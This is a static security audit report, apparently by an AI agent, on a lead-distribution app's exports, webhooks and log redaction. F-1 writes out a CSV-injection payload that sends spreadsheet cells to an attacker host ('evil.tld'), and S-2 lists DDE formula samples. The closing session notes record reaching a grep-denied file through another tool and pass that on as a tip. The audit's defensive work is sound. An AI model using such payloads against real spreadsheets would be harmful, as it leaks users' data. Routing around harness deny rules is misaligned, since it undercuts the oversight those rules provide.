# Security Audit — Exports, Downloads, Scheduled Delivery, Outbound Lead Distribution

**Scope:** exports, downloads, scheduled delivery, outbound lead distribution
**Worktree:** `C:/Users/Windows/bl-wt-secaudit` @ `60f1b00` (fresh tip of origin/main)
**Method:** read-only static audit. No files edited under audit. **No pytest run** (bare pytest reads the production `.env`; it has wiped prod twice).
**Date:** 2026-09-16

**Verdict: no P0. One P1, five P2, three P3.**
The *file* export surface (CSV / Excel / JSON / R2 / in-app / batch / segments) is well built: one canonical builder, sanitized end to end, every query tenant-filtered, no IDOR found. The *push* surface (dialer + outbound webhook) bypasses that builder entirely. A separate redaction-policy gap leaks three different secrets into logs.

---

## Direct answers

| Question | Answer | Evidence |
|---|---|---|
| JSON **file** export sanitized on main today? | **YES** | `src/utils/data_exporter.py:201-206` |
| Is `fix/json-export-csv-injection` merged? | **YES — landed.** Stale branch pointer, safe to delete | `git branch --merged main` lists it; `git diff --stat main fix/json-export-csv-injection` shows main strictly ahead |
| Any raw-ORM JSON file path (a sibling to the dialer gap)? | **NO** | `data_exporter.py:210` is the only lead-JSON writer in `src/`; sole entry `export()` at `:251-255` |
| Excel / xlsx sanitized? | **YES** | `data_exporter.py:134` → `_canonical_dataframe` → `build_lead_export_row` (`:79-86`) |
| Column HEADERS sanitized? | **YES**, and no header is ever county/user-derived | `src/utils/lead_export.py:696`; constants at `:43`, `:763` |
| Emailed attachment sanitized? | **N/A — there is no attachment**; a link only, to the sanitized file | `src/workers/delivery.py:118-136` |
| Dialer push payload sanitized? | **NO** — see F-1 | `src/workers/scheduler_helpers/dialer.py:210-222` |
| Outbound webhook payload sanitized? | **NO** — see F-1 | `src/workers/webhook_delivery.py:171-184` |
| Presigned R2 URL in production? | **NO** — revocable JWT against the API instead | `src/workers/tasks_helpers/status.py:52-69` |
| Download TTL | **48h** emailed / **60s** in-app | `status.py:49` (`_DELIVERY_TOKEN_TTL = 172800`); `src/api/routes/jobs.py:1005` |
| Object key tenant-scoped + non-enumerable? | **YES** | `src/workers/tasks.py:1319`; `src/workers/batch_export.py:478` |
| Can one delivery include another tenant's records? | **NO** — every selection query is `user_id`-filtered; dedup pool is per-user | see S-8 |

### Why JSON is definitively clean

`data_exporter.py:201-206` builds every row through the shared builder:
```python
row = _apply_visibility(
    build_lead_export_row(rec, today, auction_today=auction_today, context=context),
    hidden_fields,
)
```
`build_lead_export_row` (`lead_export.py:547-656`) applies `sanitize_for_csv` to every text field. `data_exporter.py:177-189` records that the *old* JSON path dumped raw input dicts and leaked `raw_html_hash` + the raw `enrichment_data` blob — that is the bug the merged branch fixed.

I grepped every `json.dump*` / `to_json` in `src/` and `main.py`: `data_exporter.py:210` is the **only** lead-JSON file writer, reachable only via `DataExporter.export()` (`:251-255`), gated on `SUPPORTED_EXPORT_FORMATS` (`src/config/constants.py:322`). Every other hit is a DB column payload, Redis pub/sub, or HMAC canonicalization. **The dialer asymmetry in F-1 is unique to the push paths.**

---

# FINDINGS

## F-1 — Dialer & outbound-webhook JSON payloads bypass `sanitize_for_csv` entirely
**CLASSIFICATION: CONFIRMED VULNERABILITY · SEVERITY: P1**

**EVIDENCE.** `src/workers/scheduler_helpers/dialer.py:210-222` — built straight off the ORM row:
```python
leads = [
    {
        "id": row.id,
        "party_name": row.party_name,
        "phone": row.phone,
        "phone_type": row.phone_type,
        "phone_dnc_flag": row.phone_dnc_flag,
        "email": row.email,
        "property_address": row.property_address,
        "mailing_address": row.mailing_address,
    }
    for row in rows
]
```
`src/workers/webhook_delivery.py:171-184` copies these verbatim into the outbound body. `src/workers/dialer_outbox.py:170-179` does the same for PhoneBurner, and `src/workers/dialer_connectors/phoneburner.py:81-101` maps `party_name` → `first_name` / `last_name` / `custom_fields.owner_name` via `_split_name` (`:33-48`), which only `.strip()/.split()`s.

Verified by direct count — **zero** occurrences of the sanitizer across all five outbound modules:
```
src/workers/webhook_delivery.py:0          src/workers/dialer_outbox.py:0
src/workers/scheduler_helpers/dialer.py:0  src/workers/dialer_connectors/phoneburner.py:0
src/workers/dialer_connectors/generic_webhook.py:0
```
Ingest does not sanitize either — `src/workers/tasks.py:956` is `_trunc(rec.party_name, 512)`, truncation only. **Sanitization exists only at export-row construction time.**

The repo already states the governing principle for a non-CSV format — `data_exporter.py:186-189`: *"Values are already spreadsheet-safe — `build_lead_export_row` sanitizes each emitted field."* That reasoning was applied to JSON-on-disk and never to JSON-on-the-wire.

**ATTACK PATH.** Someone files a county public record (probate petition, NTS, code-violation complaint) with an owner/grantor name of `=HYPERLINK("https://evil.tld/x?d="&A1&A2,"Open")`. The scraper stores it unmodified. The dialer sweep pushes it verbatim to the customer's PhoneBurner / Zapier / CRM. The customer exports contacts to Excel — routine workflow — and the formula executes in *their* origin, exfiltrating adjacent cells to an attacker-controlled host. **The identical row downloaded as a CSV from BridgeLeads is safe.** Constrained (requires filing a public record; lands in the customer's own tenant) but repeatable and entirely outside the customer's control.

**FIX.** Route both payload builders through `build_lead_export_row`; or minimally apply `sanitize_for_csv` to `party_name`, `property_address`, `mailing_address`, `email`, `phone_type` at `dialer.py:210-222` and `dialer_outbox.py:170-179`. Also `webhook_delivery.py:117` (`scraper_name`, user-controlled) — the email path already neutralizes that value via `header_text` at `delivery.py:90`; the webhook path does not. Add the regression test that does not currently exist (see "Tests" below).

---

## F-2 — Delivery destinations have no ownership or proof-of-control check
**CLASSIFICATION: PARTIAL-WEAK CONTROL · SEVERITY: P2** *(partly intended product behavior)*

**EVIDENCE.** `src/api/schemas.py:487` and `:546-551` are the complete validation:
```python
emails: list[EmailStr] = Field(default_factory=list, max_length=10)
...
def limit_recipients(cls, v: list) -> list:
    if len(v) > 10:
        raise ValueError("Maximum 10 delivery email addresses")
    return v
```
Format and count only. No comparison to `user.email`, no confirmation/opt-in, no domain check, no notification to the account owner. Same for `webhook_url` / `dialer_webhook_url` — no echo-token, no verification POST.

Send time **does** re-read from the DB, which is correct: `src/workers/tasks.py:1234` (`config.deliver`) → `:2264-2275`. Scheduled runs pass only `job_id` (`src/workers/scheduler_helpers/dispatch.py:263-265`), never a persisted recipient — so revoking a destination takes effect immediately.

**ATTACK PATH / HONEST ASSESSMENT.** Routing leads to a VA, partner, or team inbox is legitimate and expected; "arbitrary addresses are allowed" is **not** the defect. The defect is the **absence of any detective control**. An attacker holding a session or an API key adds a 10th address, and every future scheduled export silently mirrors to them indefinitely, with nothing in the UI or in any inbox that tells the owner. The channel survives password rotation.

**FIX.** Email the account owner whenever a delivery destination is added or changed (detective, non-breaking, cheap). Optionally require one-click confirmation for a new address before first delivery.

---

## F-3 — The 48h signed download URL can reach worker logs and the Celery result backend
**CLASSIFICATION: CONFIRMED VULNERABILITY · SEVERITY: P2**

**EVIDENCE.** `src/workers/webhook_delivery.py:242-245` — redaction is scoped to one event type:
```python
_redact_response = payload.get("event") == "leads.dialer_ready"

def _excerpt(text: str) -> str:
    return "<redacted: dialer push>" if _redact_response else text[:500]
```
But `job.completed` is exactly the payload that **contains** the credential — `webhook_delivery.py:122-126`:
```python
"download": {"format": fmt, "url": download_url, "expires_at": expires_at},
```
That URL carries the 48h JWT (`status.py:49`). For `job.completed`, the endpoint's raw response is logged at `:327`, returned into the Celery result backend at `:347` and `:368`, and interpolated into the retry exception at `:352-355`. Broker and backend are both `settings.REDIS_URL` (`src/workers/__init__.py:13-16`).

**ATTACK PATH.** Any receiving endpoint that echoes the request body on a 4xx — extremely common for validation errors, and the **default** for webhook.site / requestbin-style hooks customers use while wiring up an integration — writes a live 48h bearer link to that tenant's full lead export into worker logs and into Redis. Anyone with log or broker read access replays it.

**FIX.** Make `_excerpt` unconditional, or substring-redact `download_url` out of `resp.text` before logging and returning.

---

## F-4 — Outbound webhook network errors log the user's full catch-hook URL
**CLASSIFICATION: CONFIRMED VULNERABILITY · SEVERITY: P2**

**EVIDENCE.** The invariant is stated at `src/workers/webhook_delivery.py:250-251`:
```python
# problem — return WITHOUT raising so Celery does not retry it. Never
# log the full URL (it may carry query-string secrets); host only.
```
Forty-eight lines later it is violated — `webhook_delivery.py:298-302`:
```python
except requests.RequestException as exc:
    _logger.warning(
        "Webhook %s delivery network error (attempt %d): %s",
        job_id[:8], attempt, str(exc)[:200],
    )
```
`requests` exception strings embed the full URL including path and query — `Max retries exceeded with url: /hooks/catch/123/abcSECRET?token=...`.

**ATTACK PATH.** A Zapier/Make catch-hook URL **is** the credential — anyone holding it injects arbitrary data into that customer's automation. A transient network blip during delivery writes it to logs in cleartext.

**FIX.** Mirror the sibling transport, which does this correctly — `src/workers/dialer_outbox.py:262-270` logs `type(exc).__name__` and `host` only.

---

## F-9 — The access-log redaction filter is far narrower than its name suggests
**CLASSIFICATION: CONFIRMED VULNERABILITY · SEVERITY: P2**
*(Independently found by team-lead for the Tracerfy path; this is the shared root cause of F-3, F-4 and that finding.)*

**EVIDENCE.** `main.py:114-129`:
```python
_TOKEN_RE = re.compile(r"token=[A-Za-z0-9_\-\.]+")

class _StripTokenFilter(logging.Filter):
    """Redact download tokens from uvicorn access log lines."""
    def filter(self, record: logging.LogRecord) -> bool:
        if hasattr(record, "args") and record.args:
            record.args = tuple(
                _TOKEN_RE.sub("token=REDACTED", str(a)) if isinstance(a, str) else a
                for a in record.args
            )
        return True

logging.getLogger("uvicorn.access").addFilter(_StripTokenFilter())
```
Three limits, each independently exploitable:
1. **Query params only.** The regex cannot match a **path segment**, so `/webhooks/tracerfy/<TRACERFY_WEBHOOK_SECRET>` — the shape documented at `.env.example:128` — is logged **in full**. That secret is the bearer credential for the skip-trace ingest webhook.
2. **`record.args` only, never `record.msg`** (`:120-125`). Any logger that pre-formats a URL into the message string is unredacted.
3. **Attached to `uvicorn.access` only** (`:129`), **not the root logger**. It therefore provides **zero** coverage for F-3 and F-4, which are worker logs.

It *does* correctly cover the in-app/emailed download token (`/jobs/{id}/download?token=<jwt>`; the JWT charset base64url + dots matches the character class).

**FIX.** Broaden the pattern to also match secret-bearing path segments (e.g. `/(?:webhooks/tracerfy)/[A-Za-z0-9_\-]{16,}`), redact `record.msg` as well as `record.args`, and attach the filter to the **root** logger so worker output is covered. Then **rotate `TRACERFY_WEBHOOK_SECRET`** — assume it is sitting in log retention today.

---

## F-8 — `.env.example` pre-fills a public-export host and omits its safety flag
**CLASSIFICATION: CONFIRMED VULNERABILITY (latent config) · SEVERITY: P2**

**EVIDENCE.** `.env.example:29` ships a live-looking value:
```
R2_PUBLIC_URL=https://exports.bridgeleads.io
```
while the file documents **neither** `R2_ALLOW_PUBLIC_URLS` **nor** `API_BASE_URL` — I read all 213 lines; neither string appears. Both exist in `src/config/settings.py` (`:126`, `:243`). This violates `.claude/rules/settings.md`: *"New settings must be added to both `settings.py` and `.env.example`."*

**Context — the NXDOMAIN is harmless today.** `exports.bridgeleads.io` feeds only the public-URL branch, which is gated off by default (`R2_ALLOW_PUBLIC_URLS: bool = False`, `settings.py:126`) — `src/utils/data_exporter.py:319-325`:
```python
if settings.R2_PUBLIC_URL and settings.R2_ALLOW_PUBLIC_URLS:
    return f"{settings.R2_PUBLIC_URL}/{object_key}"
if settings.R2_PUBLIC_URL and not settings.R2_ALLOW_PUBLIC_URLS:
    _logger.warning(
        "R2_PUBLIC_URL is set but R2_ALLOW_PUBLIC_URLS is false — "
        "ignoring it and using presigned URLs (export PII safety)."
    )
```
So the real prod download origin is `settings.API_BASE_URL` (`https://api.bridgeleads.io`, per the Tracerfy example at `.env.example:128`), and `exports.bridgeleads.io` is dead config the code already refuses to use.

**ATTACK PATH.** An operator debugging a broken download sees a pre-filled export host in `.env.example`, greps `settings.py`, finds `R2_ALLOW_PUBLIC_URLS: bool = False`, and flips it to `true` to "turn the export host on." Every export URL becomes `https://exports.bridgeleads.io/exports/{user_id}/{job_id}/leads.csv` — **permanent, unauthenticated, no expiry, seller PII**. The pre-filled URL makes the wrong move the obvious one; the warning log is the only thing standing in the way, and it disappears the instant the flag flips.

**FIX.** Blank `R2_PUBLIC_URL=` in `.env.example`; add `R2_ALLOW_PUBLIC_URLS=false` with the PII warning inline; add `API_BASE_URL=https://api.bridgeleads.io`. Separately decide whether `exports.bridgeleads.io` should exist at all — right now it is a dangling DNS name in your own docs.

---

## F-5 — Delivery config re-read has no owner-match predicate (unlike both dialer paths)
**CLASSIFICATION: PARTIAL-WEAK CONTROL · SEVERITY: P3**

**EVIDENCE.** The query that decides **where the PII is sent** — `src/workers/tasks.py:464-466`:
```python
config = db.execute(
    select(ScraperConfig).where(ScraperConfig.id == job.scraper_config_id)
).scalar_one()
```
No `ScraperConfig.user_id == job.user_id`. The session is RLS-bound to the *job's* owner (`tasks.py:453`, `rls_sync_session(_boot_user_id)`), so RLS is the only boundary. Both dialer paths carry the explicit predicate and say why — `src/workers/dialer_outbox.py:87-92` and `src/workers/scheduler_helpers/dialer.py:116-120`:
```python
.join(
    ScraperConfig,
    (ScraperConfig.id == Job.scraper_config_id)
    & (ScraperConfig.user_id == Job.user_id),
)
```
Same shape at `src/workers/batch_export.py:598` (`db.get(ScraperBatch, run.batch_id)`), mitigated there by the composite FK (`src/db/models.py:529-530`).

**ATTACK PATH.** Not currently reachable — it requires a `jobs` row whose `scraper_config_id` points at another tenant's config, which nothing in the API can produce. But this is the project's own belt-and-suspenders rule (`.claude/rules/security.md`), and it is the one delivery path missing the suspenders — on the query that selects the recipient.

**FIX.** Add `ScraperConfig.user_id == job.user_id` to `tasks.py:465`. One line.

---

## F-6 — Delivery secrets stored plaintext; webhook URL passed as a Celery task arg
**CLASSIFICATION: PARTIAL-WEAK CONTROL · SEVERITY: P3**

**EVIDENCE.** `src/db/models.py:413` (ScraperConfig) and `:505` (ScraperBatch):
```python
deliver = Column(JSON, nullable=False, default=dict)
```
`deliver` holds `phoneburner_access_token` (a live OAuth bearer), `webhook_secret`, `dialer_webhook_secret`, and the catch-hook URLs. The same file encrypts lesser-value data — `models.py:86-99` puts `email` / `first_name` / `last_name` on `EncryptedString`, and `Result.phone` / `email` likewise.

Read-path redaction **is correct** (`src/api/schemas.py:747-753` pops the secrets and emits `*_set` booleans; blank-on-update preserves at `src/api/routes/scrapers.py:488-517`), so this is storage-at-rest only. A DB dump or read-replica leak hands over every customer's PhoneBurner token.

Related, same severity: `scheduler_helpers/dialer.py:249` and `tasks.py:2328` pass `webhook_url` (itself a secret) and the HMAC-signed payload as **Celery task args** → Redis broker. The connector's own docstring claims the opposite — `src/workers/dialer_connectors/generic_webhook.py:24-26`: *"the transport re-reads it from the DB at send time rather than from a Celery task arg."* The PhoneBurner path honors that (`dialer_outbox.py:187-191`); the generic path does not.

**FIX.** Move `deliver` to `EncryptedJSON` (the type already exists — `src/db/encrypted_types.py`). Make `deliver_job_webhook` take `job_id` and re-read the URL, matching `dialer_outbox`.

---

## F-7 — Batch CSV download omits `Cache-Control: no-store`
**CLASSIFICATION: PARTIAL-WEAK CONTROL · SEVERITY: P3**

**EVIDENCE.** `src/api/routes/batches.py:770-773`:
```python
return StreamingResponse(
    ...,
    media_type="text/csv",
    headers={"Content-Disposition": f'attachment; filename="{filename}"'},
)
```
No `no-store`, on a body containing decrypted phone/email (decrypted at `src/workers/batch_export.py:267-281`). Both sibling CSV routes set it — `src/api/routes/jobs.py:1358` (`"Cache-Control": "no-store"`) and `src/api/routes/segments.py:150` (`"private, no-store"`) — and the JSON leads routes **in the same file** set it (`batches.py:886`, `:1037`, `:1087`).

**FIX.** One line: add `"Cache-Control": "no-store"` to the headers dict at `batches.py:773`.

**Related, INFO:** `segments.py:145` calls `write_lead_csv_with_overlap(pairs, output)` with **no `hidden_fields`**, so a user who deselected `mailing_address` still receives it in the Lists CSV. Product-consistency gap, not access control.

---

# CONFIRMED SECURE CONTROLS

## S-1 — `sanitize_for_csv` is unusually thorough
`src/api/middleware/security.py:416-450`:
```python
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "\n")
_WRAPPING_QUOTES = "'\"`"
...
raw = str(value); cleaned = clean_text(raw)
probe = cleaned.lstrip().lstrip(_WRAPPING_QUOTES).lstrip()
needs_quote = (raw.startswith(...) or cleaned.startswith(...) or probe.startswith(...))
return ("'" + cleaned) if needs_quote else cleaned
```
Covers `=`, `+`, `-`, `@` plus Excel-honored TAB / CR / LF. `clean_text` (`:458-472`) strips control characters and replaces `\n` / `\r` / `\t` with a space **first**, so an *embedded* TAB — the TSV column-split trick, `"123 Main\t=cmd"` — dies too, not just a leading one. Two bypasses that most implementations ship with are closed: leading whitespace (`"   =1+1"`) via the `cleaned` check, and wrapping-quote unwrap (`"=cmd`, `'=cmd`, `` `=cmd ``) via the `probe` check.

## S-2 — The `-500` question: real numbers are NOT corrupted
Ran a standalone verbatim copy of `security.py:414-472` (no `src` import, no `.env` read):
```
'-500'              -> "'-500"          (corrupted IF sanitized)
'-A Street'         -> "'-A Street"      (corrupted)
'+12065551234'      -> "'+12065551234"   (corrupted)
'SMITH-JONES'       -> 'SMITH-JONES'     (untouched — not leading)
"O'BRIEN"           -> "O'BRIEN"         (untouched)
'(500)'             -> '(500)'           (untouched — accounting negative survives)
"=cmd|'/C calc'!A0" -> "'=cmd|'/C calc'!A0"
'"=HYPERLINK(...'   -> '\'"=HYPERLINK(...'  (quote-unwrap bypass caught)
'   =1+1'           -> "'=1+1"              (whitespace bypass caught)
```
**But every numeric export column deliberately routes around the sanitizer:**
- `delinquent_amount` / `delinquent_bill_year` — `lead_export.py:582-583`, `"" if amt is None else f"{amt}"`
- `assessed_value` / `tax_billed_amount` / `tax_paid_amount` — `_enrich_num` (`:421-439`), returns `format(d, "f")`
- `auction_date` / `default_amount` — `_plain` (`:398-402`)
- `months_delinquent` / `freshness_days` / `contactability_score` / `days_to_auction` — bare `str()` (`:625-635`)
- phones — `normalize_phone_for_dialer` (`src/utils/lead_formatting.py:136-152`), digits-only or `""`

So **a `delinquent_amount` of `-500` exports as `-500`, not `'-500`.** The carve-out is deliberate and documented (`lead_export.py:399-402`). Residual corruption is narrow: a *text* field legitimately beginning with `-` or `+` (an address like `-A Street`, an odd `legal_description`) gains a leading apostrophe.

**RECOMMENDATION: KEEP AS IS — do not switch technique.**
1. Apostrophe-prefix is the OWASP-recommended standard. Double-quote wrapping does **not** stop Excel evaluating — that is precisely the `"=cmd` bypass this implementation already closes at `:421`/`:444`. Excel's proper `quotePrefix` style attribute is xlsx-only and unreachable through the pandas `to_excel` path at `data_exporter.py:142`.
2. The expensive half of the trade-off (numbers) is already carved out correctly.
3. Effort is better spent extending this technique to the push payloads (F-1), not replacing it.

*INFO caveat:* in CSV, Excel consumes the leading apostrophe on import and hides it. In **xlsx**, openpyxl writes it as literal cell content, so the user sees `'=cmd...` in the cell. Only affects values that looked like formulas — acceptable.

## S-3 — Export authorization: no IDOR on any route
`src/api/routes/batches.py:509-519` (`_owned_batch`), `:522-541` (`_run_for`: `batch_id` + `BatchRun.user_id` + `ScraperBatch.user_id`). Both `run_id` routes bind three predicates — `batches.py:852-857` and `:1071-1076`:
```python
select(BatchRun).where(
    BatchRun.id == run_id,
    BatchRun.batch_id == batch_id,   # run must belong to THIS batch
    BatchRun.user_id == current_user.id,
)
```
The batch CSV is rebuilt on a **system** session outside RLS (`batch_export.py:376`), so isolation rests on SQL binds — and all three are present, `batch_export.py:89-93`:
```sql
JOIN jobs j ON j.id = r.job_id AND j.user_id = CAST(:uid AS uuid) AND j.status = 'done'
JOIN scraper_configs sc ON sc.id = j.scraper_config_id AND sc.user_id = CAST(:uid AS uuid)
WHERE r.user_id = CAST(:uid AS uuid) AND r.job_id = ANY(CAST(:job_ids AS uuid[]))
```
Job download: `jobs.py:1198`, `:1213`, RLS GUC set first at `:1191-1195`. Segments: triple `:uid` at `segments.py:207-209`. **No query in `batches.py` loads a tenant row by id alone.**

## S-4 — Export filters cannot be widened across tenants
`record_type` / `county` are `AND`-ed onto the tenant-scoped CTE and parameter-bound — `batch_export.py:156-159`, `:189-192`. In segments, `county_clause` is a fixed literal string with a `:counties` bind (`segments.py:469`, `:559`, `:687`). Tax / owner / dialer filters at `jobs.py:1218-1241` stack `.where()` onto an already user-scoped query. Every filter narrows; none reaches an `OR`. Request `record_types` are regex-constrained (`schemas.py:1605`), so the segment filename slug cannot inject a `Content-Disposition` header either.

## S-5 — Download authorization: revocable JWT, not a raw presign
`src/workers/tasks_helpers/status.py:52-69`:
```python
if settings.API_BASE_URL:
    token = mint_download_token(str(user_id), job_id, ttl_seconds=_DELIVERY_TOKEN_TTL)
    return f"{settings.API_BASE_URL.rstrip('/')}/jobs/{job_id}/download?token={token}"
...
if settings.ENVIRONMENT.strip().lower() == "production":
    raise RuntimeError( ... )
```
- **TTLs: 48h** emailed (`status.py:49`), **60s** in-app (`jobs.py:1005`).
- Job-scoped and audience-pinned (`src/api/download_tokens.py:21-37`; enforced at `jobs.py:1133-1148`: `purpose=="download"` ⇒ `aud=="bridgeleads-download"` + `iss=="bridgeleads"`), and **revocable** via jti blacklist + logout-all (`jobs.py:1113-1128`). Strictly better than a raw presign.
- **Stated plainly: it is still a bearer capability.** Anyone holding the link downloads that tenant's leads — logged out, or from another tenant. `jobs.py:1186` uses `get_db` (not `get_rls_db`) and resolves the user *from the token*. It travels by email and sits in a query string. Two mitigations: it is revocable, and the response is an `attachment` with no outbound links, so there is no `Referer` leak from the download itself. Live residual is F-3.
- **Failsafe is correct:** if `API_BASE_URL` were unset in prod, `_delivery_download_url` **raises** (`status.py:64-67`) rather than silently degrading to a presign. Delivery fails loudly.
- `get_download_url()` — the real presign, `data_exporter.py:300-371` — has **exactly one caller** (`status.py:69`) and is unreachable in production.

## S-6 — Object keys tenant-scoped and non-enumerable
`tasks.py:1319` → `exports/{job.user_id}/{job_id}/leads.{ext}`; `batch_export.py:478` → `exports/{run.user_id}/batch/{run.id}/combined.csv`. Both segments are UUIDs. Traversal blocked at `data_exporter.py:278-279`.

## S-7 — No stored-XSS via download
All three CSV responses send `media_type="text/csv"` + `Content-Disposition: attachment` (`jobs.py:1351-1353`, `batches.py:772-773`, `segments.py:147-149`); `X-Content-Type-Options: nosniff` is global (`security.py:497`); upload `Content-Type` comes from a fixed extension map (`data_exporter.py:280-285`), never user input. **A stored file cannot render as HTML in the app origin.**

## S-8 — No cross-tenant delivery path exists
Every record-selection query feeding an outbound path is `user_id`-filtered: `tasks.py:1272-1276` and `:1850-1855` (per-job export), `dialer.py:198-209` (push), `dialer_outbox.py:99-108` / `:135-145` / `:152-156` (outbox drain), `batch_export.py:89-92` / `:219-220` (batch), `segments.py:207-209` (lists), `jobs.py:1213` (download). No global "latest results" query. **The dedup pool is not shared** — `tasks.py:1090-1093`:
```sql
SELECT dedup_hash FROM delivered_records
WHERE first_job_id = :jid AND user_id = CAST(:uid AS uuid)
```
and the reaper joins `j.user_id = d.user_id` (`src/workers/tasks_helpers/status.py:408`). A batch spans only the caller's own child jobs (`run.child_job_ids`, system-written on an ownership-verified run).

## S-9 — Exports carry no internal fields
`LEAD_CSV_COLUMNS` (`lead_export.py:43-96`): lead identity, contact, address, county enrichment passthrough, derived signals. **No** `raw_html_hash`, **no** raw `enrichment_data` blob, **no** `Result.id` / `job_id` / `user_id`, **no** cost or billing internals, **no** cross-tenant provenance. `data_exporter.py:177-182` records that the old JSON path *did* leak `raw_html_hash` and the raw blob and was replaced. The overlap CSV adds only `lists` / `counties` / `lists_count`, both sanitized (`lead_export.py:814-815`). Matches what the product sells.
*(The dialer push does include `Result.id` as `external_id` — `webhook_delivery.py:172-173` — which is correct and necessary for idempotent upsert into the customer's own CRM.)*

## S-10 — SSRF on outbound webhooks is correct and layered
Structural check at save (`schemas.py:458-473`, deliberately not DNS); authoritative check immediately before every POST — `webhook_delivery.py:252-258` and `dialer_outbox.py:232-252` (which additionally pins `connector.ALLOWED_HOSTS`), both into `validate_outbound_webhook` (`security.py:255-272` → `validate_scraping_target(resolve=True)`). Supporting controls all present: `allow_redirects=False` (`webhook_delivery.py:296`, `dialer_outbox.py:260`), `_SESSION.trust_env = False` (`webhook_delivery.py:69`, `dialer_outbox.py:41`), 3xx treated as permanent failure, redirect `Location` logged host-only (`:311`).

## S-11 — Commit `6d8619c` (signed CSV URL out of the SSRF refusal path) is PRESENT and COMPLETE
`src/scrapers/enrichment/skip_trace.py:717-733` (`_redact_url`) and `:751-791` — the SSRF branch redacts and raises `from None`; the transport branch surfaces `type(exc).__name__` only, also `from None`.

It is complete for a reason the commit message did not claim: I checked **every** `raise ValueError` inside `validate_scraping_target` (`security.py:203-247`) — all eight are **static strings** that never interpolate the URL. So `_redact_url` is redundant defense-in-depth rather than the load-bearing control, and the redirect-hop case (where `safe_get_following` at `src/utils/safe_http.py:113` validates a *different* signed URL than `_redact_url` knows about) is closed too.

**Flag for whoever touches this next:** the commit's stated premise — *"the guard's message legitimately quotes the URL it refused"* — is no longer true of the guard. Do not "simplify" `_redact_url` away on that basis: `str(exc)` on the `requests` branch genuinely would leak, and that branch is the real one.

---

# TESTS: what they assert vs. what ships

`tests/test_csv_injection.py` asserts the real behavior and nothing false — plain text untouched (`:15-17`), all prefixes neutralized (`:20-22`), leading whitespace (`:25-26`), quote-unwrap bypass (`:29-39`), embedded TAB stripped (`:42-46`), None/empty (`:49-51`). Every assertion matches the implementation.

**The gap is coverage, not correctness.** There is **no test anywhere** asserting that the dialer push or outbound webhook payload is sanitized — which is precisely how F-1 shipped. A green suite says nothing about a path no test reaches.

---

# REMEDIATION ORDER

1. **F-1** (P1) — sanitize `dialer.py:210-222` and `dialer_outbox.py:170-179`; add the missing regression test. **NO-GO gate** per `.claude/rules/codex-collaboration.md`.
2. **F-9 + F-3 + F-4** (P2) — one redaction workstream, shared root cause. Rotate `TRACERFY_WEBHOOK_SECRET` after.
3. **F-8** (P2) — `.env.example` hygiene: blank `R2_PUBLIC_URL`, document `R2_ALLOW_PUBLIC_URLS` and `API_BASE_URL`.
4. **F-2** (P2) — owner notification on delivery-destination change.
5. **F-5 / F-6 / F-7** (P3) — owner predicate at `tasks.py:465`; `EncryptedJSON` for `deliver`; `no-store` at `batches.py:773`.

---

# SESSION NOTES

- `.env.example` is deny-ruled for `grep` in this harness but readable with the Read tool — useful for the other auditors.
- The rig Python is dead: `C:\Python313\python.exe` fails with `No module named 'encodings'`, and anaconda is gone. `uv run --no-project python` works.
- Per `.claude/rules/codex-collaboration.md`, the outbound payload builders should get a `codex challenge` pass before F-1 is patched.
